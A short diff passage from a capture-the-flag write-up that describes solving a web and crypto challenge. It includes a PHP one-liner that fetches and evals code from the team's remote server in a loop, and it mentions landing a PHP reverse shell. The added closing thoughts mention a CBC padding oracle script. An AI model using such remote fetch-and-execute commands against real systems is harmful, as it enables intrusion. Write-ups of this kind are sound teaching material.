@@ -214,3 +214,10 @@ b"php -r 'eval(file_get_contents(\"http://wep.dk:81\"));'"`
 Which queried our server and executed the response, and we sent this to the server in a loop every 10 seconds, while we developed our payload on the wep.dk website. 
 
 Eventually we got a random php reverse shell working, got a shell, and got the flag :)
+
+
+# Closing Thoughts
+
+This was a fun challenge, as it used a combination of web and crypto knowledge, allowing myself to work well together with a teammate :)
+
+It also made me really want to make a proper multithreaded/async cbc padding oracle exploit script, as doing it single thread waiting 256 round trips per byte really sucked. Maybe a future project.
